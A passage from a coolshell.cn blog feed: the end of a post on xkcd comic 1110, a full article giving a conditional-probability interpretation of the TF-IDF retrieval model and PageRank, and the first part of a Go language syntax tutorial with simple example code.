<p style="padding-left: 30px;">3）如果你要下载所有的图，你可以使用这个<a href="http://lebbeo.us/static/get-xkcd-1110.py" target="_blank">Python脚本</a>来完成（<a href="http://lebbeo.us/2012/09/19/not-bbq-fetching-component-images-of-xkcd-comic-1110/" target="_blank">转自这篇文章</a>）</p>
<p style="padding-left: 30px;">4）还有人把它搞成了像Google Map一样的东西。 你可以访问下面的链接：</p>
<blockquote>
<ul>
<li><a href="http://xkcd-map.rent-a-geek.de/" target="_blank">http://xkcd-map.rent-a-geek.de/</a></li>
<li><a href="http://xkcdmap.webege.com/" target="_blank">http://xkcdmap.webege.com/ </a></li>
</ul>
<p>5）看看Hacker News的讨论贴吧，什么都有了（<a href="https://news.ycombinator.com/item?id=4542367" target="_blank">http://news.ycombinator.com/item?id=4542367</a>）</p>
</blockquote>
<p>当然，对于这个图最强的一个站点如下，解释了所有和这个图有关信息，包括图中的各种文字和图案的意思。</p>
<p style="text-align: center;"><a href="http://www.explainxkcd.com/wiki/index.php?title=1110:_Click_and_Drag" target="_blank">http://www.explainxkcd.com/wiki/index.php?title=1110:_Click_and_Drag</a></p>
<p style="text-align: left;">看到这个图后，我陷入了深深地沉思，我在想。是什么样的动力能让人干出这样的事来？兴趣，还是为了好玩。还就是为了证明他能干一些让人拍案叫绝的东西？<strong>这可能就是一种Geek精神吧。就是为了能做出让世人冿冿乐道的东西</strong>。</p>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2012-10-16T08:15:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/8398.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ TF-IDF模型的概率解释 ]]></title>
<link>https://coolshell.cn/articles/8422.html</link>
<content><![CDATA[ 
<p><strong><span style="color: #cc0000">（感谢 </span></strong><a href="https://weibo.com/weidagang" target="_blank">@猫叔shiro</a><strong><span style="color: #cc0000">（以前的todd） 投递此文）</span></strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E6%A6%82%E8%BF%B0" title="信息检索概述">信息检索概述</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#tf-idf%E6%A8%A1%E5%9E%8B" title="tf-idf模型">tf-idf模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E9%97%AE%E9%A2%98%E7%9A%84%E6%A6%82%E7%8E%87%E8%A7%86%E8%A7%92" title="信息检索问题的概率视角">信息检索问题的概率视角</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%9B%92%E5%AD%90%E5%B0%8F%E7%90%83%E6%A8%A1%E5%9E%8B" title="盒子小球模型">盒子小球模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%96%87%E6%A1%A3%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87Pd%E4%B8%8EPageRank" title="文档先验概率P(d)与PageRank">文档先验概率P(d)与PageRank</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E8%AF%8D%E7%9A%84%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87Pw" title="词的先验概率P(w)">词的先验概率P(w)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E8%AF%8D%E4%BB%A3%E8%A1%A8%E6%96%87%E6%A1%A3%E4%B8%BB%E9%A2%98%E7%9A%84%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87Pw_d" title="词代表文档主题的条件概率P(w | d)">词代表文档主题的条件概率P(w | d)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E8%AF%8D%E7%9A%84%E4%BF%A1%E6%81%AF%E9%87%8F%E5%92%8Cidf" title="词的信息量和idf">词的信息量和idf</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%A4%9A%E5%85%B3%E9%94%AE%E8%AF%8D" title="多关键词">多关键词</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E6%A6%82%E8%BF%B0"></span>信息检索概述<span class="ez-toc-section-end"></span>
</h4>
<p>信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把信息检索问题抽象为：在文档集合D上，对于由关键词w[1] … w[k]组成的查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D’。</p>
<p>对于这一问题，先后出现了布尔模型、向量模型等各种经典的信息检索模型，它们从不同的角度提出了自己的一套解决方案。布尔模型以集合的布尔运算为基础，查询效率高，但模型过于简单，无法有效地对不同文档进行排序，查询效果不佳。向量模型把文档和查询串都视为词所构成的多维向量，而文档与查询的相关性即对应于向量间的夹角。不过，由于通常词的数量巨大，向量维度非常高，而大量的维度都是0，计算向量夹角的效果并不好。另外，庞大的计算量也使得向量模型几乎不具有在互联网搜索引擎这样海量数据集上实施的可行性。</p>
<h4>
<span class="ez-toc-section" id="tf-idf%E6%A8%A1%E5%9E%8B"></span>tf-idf模型<span class="ez-toc-section-end"></span>
</h4>
<p>目前，真正在搜索引擎等实际应用中广泛使用的是tf-idf模型。tf-idf模型的主要思想是：如果词w在一篇文档d中出现的频率高，并且在其他文档中很少出现，则认为词w具有很好的区分能力，适合用来把文章d和其他文章区分开来。该模型主要包含了两个因素：</p>
<p><span id="more-8422"></span></p>
<p>1) 词w在文档d中的词频tf (Term Frequency)，即词w在文档d中出现次数count(w, d)和文档d中总词数size(d)的比值：</p>
<pre><code>tf(w,d) = count(w, d) / size(d) </code></pre>
<p>2) 词w在整个文档集合中的逆向文档频率idf (Inverse Document Frequency)，即文档总数n与词w所出现文件数docs(w, D)比值的对数:</p>
<pre><code>idf = log(n / docs(w, D)) </code></pre>
<p>tf-idf模型根据tf和idf为每一个文档d和由关键词w[1]…w[k]组成的查询串q计算一个权值，用于表示查询串q与文档d的匹配度：</p>
<pre><code>
tf-idf(q, d) 
= sum { i = 1..k | tf-idf(w[i], d) } 
= sum { i = 1..k | tf(w[i], d) * idf(w[i]) } 
</code></pre>
<h4>
<span class="ez-toc-section" id="%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E9%97%AE%E9%A2%98%E7%9A%84%E6%A6%82%E7%8E%87%E8%A7%86%E8%A7%92"></span>信息检索问题的概率视角<span class="ez-toc-section-end"></span>
</h4>
<p>直观上看，tf描述的是文档中词出现的频率；而idf是和词出现文档数相关的权重。我们比较容易定性地理解tf-idf的基本思想，但具体到tf-idf的一些细节却并不是那么容易说清楚为什么。比如：</p>
<p>1) 为什么tf是count(w, d) / size(d)？能不能是log(count(w, d) / size(d))等其他形式？</p>
<p>2) 为什么idf是一个log形式？</p>
<p>3) 为什么tf和idf之间是乘积关系，而不是加法或指数关系？</p>
<p>4) 为什么多个关键词的tf-idf值是加法关系，而不是乘法或者指数关系？</p>
<p>5) 除了tf-idf值，Google还会计算网页的PageRank值，二者相乘得到最后的权值，为什么是乘法，而不是加法或指数？</p>
<p>据说，最初甚至tf-idf的提出者自己也没有对诸如“为什么idf是log形式”这个问题给出有力的解释，虽然后来有人从信息论的角度对idf的log形式给出了令人信服的解释，但是剩下的其他一些疑问仍然存在。在我了解的范围内，对于tf-idf模型还没有一个真正统一完整的理论解释。在试图为tf-idf找到更好的理论解释的过程中，我意识到对tf-idf模型种种疑问的根源在于tf-idf试图表达的“查询q和文档的匹配度”本身就有一定的模糊性，什么叫做“匹配度”，这就有很大的自由发挥空间。如果说向量模型的用向量夹角来表示匹配度概念还有一定的理论基础，那么用tf-idf来表达匹配度就有点“与其说是科学，不如说是艺术”的味道。</p>
<p>更进一步，其实，信息检索问题的抽象方式“在文档集合D上，对于给定查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D’”本身是值得反思的。我们应当考虑抛弃“匹配度”这种模糊的目标，从根源上寻求一种具有明确数学意义的目标。如果我们从概率视角来看，<strong>把“查询串q和文档d的匹配度”问题转换为“当查询串是q时，用户期望获得文档d的概率”问题</strong>，信息检索问题就清晰多了。一方面这个概率描述是站在人的角度来看待信息检索问题的，更加贴近实际的用户体验；另一方面，概率本身是有明确数学意义的，这样我们就首先从目标上对问题进行了严格化。</p>
<p>下面，我将通过一个模型，从概率的视角，一边解释tf-idf的概率意义，一边指出其不合理之处。</p>
<h4>
<span class="ez-toc-section" id="%E7%9B%92%E5%AD%90%E5%B0%8F%E7%90%83%E6%A8%A1%E5%9E%8B"></span>盒子小球模型<span class="ez-toc-section-end"></span>
</h4>
<p>为了分析“当查询串是q时，用户期望获得文档d的概率”问题，我首先建立了一种称为“盒子小球模型”的简化模型。盒子小球模型把词想象成各种不同颜色的小球，文档想象成装有若干小球的盒子，把“当查询串是q时，用户期望获得文档d的概率“转换为下面的问题：</p>
<p><strong>有n个盒子d[1], d[2], … d[n]，每个盒子中有若干不同颜色的小球，有人随机地选择了一个盒子，并从盒子中随机地拿出了一个颜色为w[j]的小球，那么这个小球来自于盒子d[i]的概率是多少？</strong></p>
<p>其实，这就是经典的条件概率问题P(d[i] | w[j])，采用贝叶斯推断将其转化为：</p>
<pre><code>
P(d[i] | w[j]) 
= P(d[i], w[j]) / P(w[j]) 
= P(d[i]) * P(w[j] | d[i]) / P(w[j]) 
</code></pre>
<p>我们注意到这个条件概率包括几个部分，P(d[i])是盒子d[i]被选中的先验概率，p(w[j])是w[j]颜色小球被选中的先验概率，P(w[j] | d[i])是在盒子d[i]中选中颜色w[j]小球的条件概率。</p>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E6%A1%A3%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87Pd%E4%B8%8EPageRank"></span>文档先验概率P(d)与PageRank<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们来看盒子d[i]被选中的先验概率P(d[i])是什么。P(d[i])的意义是：当用户什么也没有输入的时候，它可能对文档d[i]感兴趣的概率。在没有更多信息的情况下，我们可以认为每个盒子被选中的先验概率P(d[i])是相等的，都等于1 / m，其中m表示总文档数（总盒子数），这时P(d[i])作为公共系数可被忽略。不过，在实际应用中，我们通常可以根据其他知识获得各文档的先验概率，比如，学术文献和网页通常可以基于引用度模型计算其先验概率，这些经典论文和热门网页是多数人乐于见到的。说到这里，你可能已经发现，Google PageRank本质上就是这个先验概率P(d[i])乘以某个系数！所以，PageRank实际上也被纳入这个条件概率模型中来了，这就不难解释为什么在Google的排序算法中PageRank权重和tf-idf权重是一种乘积关系而不是加或者指数关系。另一方面，在理解了文档先验概率对整个搜索结果概率的影响后，当搜索引擎中针对PageRank出现各种假链接SEO时，我们可以不拘泥于基于链接引用模型的PageRank，只要是以网页先验概率为目标，不论是采用基于链接引用的PageRank，还是基于搜索结果点击数模型，或是其他模型，都是可以的。这就是“变通”，从原理上“通”了，就可以在方法上“变”。</p>
<h4>
<span class="ez-toc-section" id="%E8%AF%8D%E7%9A%84%E5%85%88%E9%AA%8C%E6%A6%82%E7%8E%87Pw"></span>词的先验概率P(w)<span class="ez-toc-section-end"></span>
</h4>
<p>下面我们来考察词w[j]的先验概率P(w[j])。P(w[j])的意义是：在整个文档集合中，w[j]被作为搜索关键词的概率，比如：“iPhone 5”，“青花瓷”这类词被用作搜索关键词的概率较高，而“的”，“什么”，“我们”这类高频词不大可能成为搜索关键词。那么，我们如何来定量计算P(w[j])呢？一种思路就是把w[j]在文档集中出现的频率作为其先验概率。不过，显然存在更好的方案：在大量的搜索查询中进行统计，统计方法得出P(w[j])的方法很接近P(w[j])本质的，不需要引入额外的假设。比如，一段时间内某搜索引擎的搜索总次数为10^10次，“公积金”这个词出现了100次，那么，我们可以认为先验概率P(“公积金”)就是100 / 10^10 = 10^-8。</p>
<h4>
<span class="ez-toc-section" id="%E8%AF%8D%E4%BB%A3%E8%A1%A8%E6%96%87%E6%A1%A3%E4%B8%BB%E9%A2%98%E7%9A%84%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87Pw_d"></span>词代表文档主题的条件概率P(w | d)<span class="ez-toc-section-end"></span>
</h4>
<p>最后，我们来看条件概率P(w[j] | d[i])。P(w[j] | d[i])的意义是在文档d[i]中，人们用关键词w[j]来搜索它的概率。那么，什么样的词是人们会用来搜索一篇文档的呢？多数情况下，是那些代表一篇文档主题的词。比如，有一篇新闻是关于iPhone 5发布会的，那么“iPhone5”， “发布会”，“库克”，“苹果”这些词基本上就构成了文章的主题；那么，反过来说，如果用户想搜索这篇关于iPhone 5发布会的新闻，他就有很大的可能通过这几个词来进行搜索。我们应当注意分辨P(w[j] | d[i])与P(w[j])的区别，后者可以通过大量的查询统计得来，而前者不能与后者直接划等号，因为前者的意义是w[j]代表d[i]主题的概率。如果非要引入统计方法，那么P(w[j] | d[i])对应的统计是：当搜索关键词是w[j]且搜索结果包含d[i]时，用户点击（满意）d[i]作为搜索结果的频率。比如，用“iPhone5 发布会”的搜索，在结果中有都10000次出现了网页x，其中，用户8000次点击了网页x，那么，可以认为有80%的概率网页x的主题是关于“iPhone5 发布会”的。</p>
<h4>
<span class="ez-toc-section" id="%E8%AF%8D%E7%9A%84%E4%BF%A1%E6%81%AF%E9%87%8F%E5%92%8Cidf"></span>词的信息量和idf<span class="ez-toc-section-end"></span>
</h4>
<p>上面谈到了对P(w[j] | d[i])的计算的统计方法，但该方法有一定的局限，比如，要能进行统计首先需要文档出现在足够多的搜索结果中，需要时间和量的积累。除了统计方法外，我们可以考虑其他方法计算词w[j]代表文档d[i]主题的概率。可能有人立刻会想到要对文章进行语义分析提取关键词，给这些关键词高权重，给其他词低权重。这种想法有一定的合理性，但实现上涉及语义分析，没有成熟高效的方法。实际上，信息论为我们提供了另一条高效方案。上面谈到“的”，“什么”，“我们”这类高频词不会成为文档主题和搜索关键词的原因是它们不能提供足够的信息，而“iPhone 5”，“发布会”这样的词汇则信息量丰富。所谓信息是指对不确定性（熵）的减小程度，信息的单位是比特(bit)，信息量越大对于不确定性的减小程度越大。比如，外面可能在下雨也可能没有下雨，可能性空间大小为2，如果我们看一眼窗外，可能性空间就变成了1，那么“看见窗外在下雨”所提供的信息量就和熵的减小程度成正比，具体来讲等于log(2/1)=1。如果要用二进制编码是否下雨，需要1个bit，0代表没有下雨，1代表下雨。</p>
<p>但在很多场景下，各个可能性的概率并不相同，比如：欧洲杯16只球队都可能夺冠，赛前它们夺冠的先验概率并不相同，那么结果的不确定性程度实际上是小于log(16)=4。如果你没有看比赛，有人告诉你西班牙夺冠了，你可能会觉得很正常，但如果有人告诉你瑞士夺冠了，你通常会非常惊讶。这一现象的理论解释是，如果赛前西班牙夺冠概率是1/4，而瑞士夺冠概率是1/32，那么，“西班牙夺冠”的信息量为log(4)=2，即把不确定性减小为原来的1/4，而“瑞士夺冠”的信息量为log(32)=5，不确定性减小为原来的1/32，一下子接受比前者大了两倍以上的信息量，当然你会吃惊。</p>
<p>回到信息检索，比如，“2012美国大选”这个查询串包含了“2012”，“美国”和“大选”3个关键词，我们应该如何定量计算它们的信息量呢？根据信息的定义，词的信息量等于它对不确定性的缩小程度。如果文档总数为2^30，其中2^14篇文档出现了“美国”，那么“美国”这个词就把文档的不确定性从2^30缩小为2^14，它所包含的信息量为log(2^30/2^14)=16；而只有2^10篇文档出现了“大选”，那么大选的信息量就是log(2^30/2^10)=20，比“美国”多了4个bit。而“的”，“什么”，“我们”这些高频词对减小文档不确定性几乎没有帮助，因而信息量为0。相信你已经发现，上面idf(w)公式中的log(n / docs(w, D))实际上就是词w的信息量了。</p>
<p>如果我们考虑词的信息量对条件概率P(w[j] | d[i])的影响，假设“词w在文档中被选中的概率与其在文档中的出现频率和其信息量的乘积成正比”，那么上面的条件概率模型就变成：</p>
<pre><code>
P(d[i] | w[j]) 
= P(d[i], w[j]) / P(w[j]) 
= P(d[i]) * P(w[j] | d[i]) / P(w[j]) 
= P(d[i]) * (tf(w[j], d[i]) * idf(w[j] / sum { k = 1..size(d[i]), tf(w[k], d[i]) * idf(w[k]) }) / p(w[j]) 
= P(d[i]) * (tf-idf(w[j], d[i]) / sum { k = 1..size(d[i]), tf-idf(w[k], d[i]) }) / p(w[j]) 
= P(d[i]) * (tf-idf(w[j], d[i]) / tf-idf(d[i])) / p(w[j]) 
</code></pre>
<p>我们看到tf-idf已经被纳入框架内了，但是还多出文档先验概率P(d[i])，关键词先验概率P(w[j])和文档各词的总tf-idf(d[i])。普通搜索引擎是基于PageRank和tf-idf的，那么，根据这个概率模型，我们可以看出，它没有考虑文档总tf-idf(d[i])和关键词先验概率p(w[j])。如果考虑这两个因素，相信搜索效果会更好。</p>
<h4>
<span class="ez-toc-section" id="%E5%A4%9A%E5%85%B3%E9%94%AE%E8%AF%8D"></span>多关键词<span class="ez-toc-section-end"></span>
</h4>
<p>上面的条件概率模型主要是针对单个关键词的情况，下面我们进一步将其扩展到多关键词情况。我们知道，在tf-idf中，多个关键词的所产生的tf-idf值是一种叠加关系，那么这是否符合条件概率模型呢？答案是否定的。在两个关键字情况下，条件概率问题转化为“如果有人从一个盒子中同时摸出颜色w[x]的小球和颜色w[y]的小球，这两个小球来自于盒子d[i]的概率是多少？”。假设从盒子中摸出各个小球事件是相互独立的情况下，即</p>
<pre><code>
P(w[x], w[y]) 
= P(w[x]) * P(w[y]) P(w[x], w[y] | d[i]) 
= P(w[x] | d[i]) * P(w[y] | d[i]) 
</code></pre>
<p>我们可以推导出条件概率：</p>
<pre><code>
P(d[i] | w[x], w[y]) 
= P(d[i], w[x], w[y]) / P(w[x], w[y]) 
= P(d[i]) * P(w[x], w[y] | d[i]) / P(w[x], w[y]) 
= P(d[i]) * P(w[x] | d[i]) * P(w[y] | d[i]) / (P(w[x] * P(w[y])) 
= P(d[i]) * (tf-idf(w[x], d[i]) / tf-idf(d[i])) * ((tf-idf(w[y], d[i]) / tf-idf(d[i]))) / (p(w[x]) * P(w[y])) 
</code></pre>
<p>可见，概率模型所得出的各个关键词的tf-idf值之间是乘积关系，这是与tf-idf模型的加法关系是不同的。这一点可能与二者是否要求“文档必须包含所有查询关键词”的基本假设有关系。在文档不包含所有关键字的这种情况下，tf-idf模型可能得出一个非0的匹配度，但条件概率模型得出的概率肯定为0。不过，如果考虑一般查询关键词数量不多（3个以内），而大量文档都同时包含这些关键词，概率模型的乘积关系是比tf-idf模型的加法关系更有理论基础。从根本上讲，这是因为tf-idf的“匹配度”是一个模棱两可的概念，而条件概率有坚实的理论基础。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>TF-IDF模型是搜索引擎中广泛使用的信息检索模型，但对于TF-IDF模型一直存在各种疑问。本文为信息检索问题一种基于条件概率的盒子小球模型，其核心思想是把“查询串q和文档d的匹配度问题”转化为“查询串q来自于文档d的条件概率问题”。它从概率的视角为信息检索问题定义了比TF-IDF模型所表达的匹配度更为清晰的目标。从概率模型中，我们看到查询串q来自于文档d的条件概率主要包含以下几个因素：1) 文档的先验概率P(d[i])，这与PageRank对应；2) 词w被作为搜索关键词的先验概率P(w)，这可以通过统计方法获得；3) 关键词w代表文档d主题，或以词w搜索文档d的概率，P(w | d)，除了统计方法，这可以通过tf-idf来计算。</p>
 ]]></content>
<pubDate>2012-10-24T09:05:54+08:00</pubDate>
<guid>https://coolshell.cn/articles/8422.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go 语言简介（上）— 语法 ]]></title>
<link>https://coolshell.cn/articles/8460.html</link>
<content><![CDATA[ 
<p>周末天气不好，只能宅在家里，于是就顺便看了一下Go语言，觉得比较有意思，所以写篇文章介绍一下。<strong>我想写一篇你可以在乘坐地铁或公交车上下班时就可以初步了解一门语言的文章</strong>。所以，下面的文章主要是以代码和注释为主。只需要你对C语言，Unix，Python有一点基础，我相信你会在30分钟左右读完并对Go语言有一些初步了解的。</p>
<p><img alt="image placeholder" ></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Hello_World" title="Hello World">Hello World</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%BF%90%E8%A1%8C" title="运行">运行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%87%AA%E5%B7%B1%E7%9A%84package" title="自己的package">自己的package</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#fmt%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F" title="fmt输出格式">fmt输出格式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%8F%98%E9%87%8F%E5%92%8C%E5%B8%B8%E9%87%8F" title="变量和常量">变量和常量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%95%B0%E7%BB%84" title="数组">数组</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%95%B0%E7%BB%84%E7%9A%84%E5%88%87%E7%89%87%E6%93%8D%E4%BD%9C" title="数组的切片操作">数组的切片操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5" title="分支循环语句">分支循环语句</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%85%B3%E4%BA%8E%E5%88%86%E5%8F%B7" title="关于分号">关于分号</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#map" title="map">map</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E6%8C%87%E9%92%88" title="指针">指针</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D" title="内存分配 ">内存分配 </a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%87%BD%E6%95%B0" title="函数">函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E7%BB%93%E6%9E%84%E4%BD%93" title="结构体">结构体</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E6%96%B9%E6%B3%95" title="结构体方法">结构体方法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%A4%9A%E6%80%81" title="接口和多态">接口和多态</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_Error%E6%8E%A5%E5%8F%A3" title="错误处理 – Error接口">错误处理 – Error接口</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_Defer" title="错误处理 – Defer">错误处理 – Defer</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_PanicRecover" title="错误处理 – Panic/Recover">错误处理 – Panic/Recover</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Hello_World"></span>Hello World<span class="ez-toc-section-end"></span>
</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//文件名：hello.go
package main //声明本文件的package名

import "fmt" //import语言的fmt库——用于输出

func main() {
    fmt.Println("hello world")
}</pre>
<p><span id="more-8460"></span></p>
<h4>
<span class="ez-toc-section" id="%E8%BF%90%E8%A1%8C"></span>运行<span class="ez-toc-section-end"></span>
</h4>
<p>你可以有两种运行方式，</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">#解释执行（实际是编译成a.out再执行）
$go run hello.go
hello world

#编译执行
$go build hello.go

$ls
hello hello.go

$./hello
hello world</pre>
<h4>
<span class="ez-toc-section" id="%E8%87%AA%E5%B7%B1%E7%9A%84package"></span>自己的package<span class="ez-toc-section-end"></span>
</h4>
<p>你可以使用GOPATH环境变量，或是使用相对路径来import你自己的package。</p>
<p>Go的规约是这样的：</p>
<p style="padding-left: 30px;">1）<strong>在import中，你可以使用相对路径，如 ./或 ../ 来引用你的package</strong></p>
<p style="padding-left: 30px;">2）<strong>如果没有使用相对路径，那么，go会去找$GOPATH/src/目录。</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//使用相对路径
import "./haoel"  //import当前目录里haoel子目录里的所有的go文件
</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//使用GOPATH路径
import "haoel"  //import 环境变量 $GOPATH/src/haoel子目录里的所有的go文件
</pre>
<h4>
<span class="ez-toc-section" id="fmt%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F"></span>fmt输出格式<span class="ez-toc-section-end"></span>
</h4>
<p>fmt包和libc里的那堆使用printf， scanf，fprintf，fscanf 很相似。下面的东西对于C程序员不会陌生。</p>
<p>注意：Println不支持，Printf才支持%式的输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"
import "math"

func main() {
    fmt.Println("hello world")

    fmt.Printf("%t\n", 1==2)
    fmt.Printf("二进制：%b\n", 255)
    fmt.Printf("八进制：%o\n", 255)
    fmt.Printf("十六进制：%X\n", 255)
    fmt.Printf("十进制：%d\n", 255)
    fmt.Printf("浮点数：%f\n", math.Pi)
    fmt.Printf("字符串：%s\n", "hello world")
}</pre>
<p>当然，也可以使用如\n\t\r这样的和C语言一样的控制字符</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%98%E9%87%8F%E5%92%8C%E5%B8%B8%E9%87%8F"></span>变量和常量<span class="ez-toc-section-end"></span>
</h4>
<p>变量的声明很像 javascript，使用 var关键字。注意：<strong>go是静态类型的语言</strong>，下面是代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//声明初始化一个变量
var  x int = 100
var str string = "hello world"&lt;/pre&gt;
//声明初始化多个变量
var  i, j, k int = 1, 2, 3

//不用指明类型，通过初始化值来推导
var b = true //bool型
</pre>
<p>还有一种定义变量的方式（这让我想到了Pascal语言，但完全不一样）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">x := 100 //等价于 var x int = 100;
</pre>
<p>常量很简单，使用const关键字：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">const s string = "hello world"
const pi float32 = 3.1415926
</pre>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E7%BB%84"></span>数组<span class="ez-toc-section-end"></span>
</h4>
<p>直接看代码（注意其中的for语句，和C很相似吧，就是没有括号了）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
    var a [5]int
    fmt.Println("array a:", a)

    a[1] = 10
    a[3] = 30
    fmt.Println("assign:", a)

    fmt.Println("len:", len(a))

    b := [5]int{1, 2, 3, 4, 5}
    fmt.Println("init:", b)

    var c [2][3]int
    for i := 0; i &lt; 2; i++ {
        for j := 0; j &lt; 3; j++ {
            c[i][j] = i + j
        }
    }
    fmt.Println("2d: ", c)
}
</pre>
<p>运行结果：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
array a: [0 0 0 0 0]
assign: [0 10 0 30 0]
len: 5
init: [1 2 3 4 5]
2d:  [[0 1 2] [1 2 3]]

</pre>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E7%BB%84%E7%9A%84%E5%88%87%E7%89%87%E6%93%8D%E4%BD%9C"></span>数组的切片操作<span class="ez-toc-section-end"></span>
</h4>
<p>这个很Python了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
a := [5]int{1, 2, 3, 4, 5}

b := a[2:4] // a[2] 和 a[3]，但不包括a[4]
fmt.Println(b)

b = a[:4] // 从 a[0]到a[4]，但不包括a[4]
fmt.Println(b)

b = a[2:] // 从 a[2]到a[4]，且包括a[2]
fmt.Println(b)

</pre>
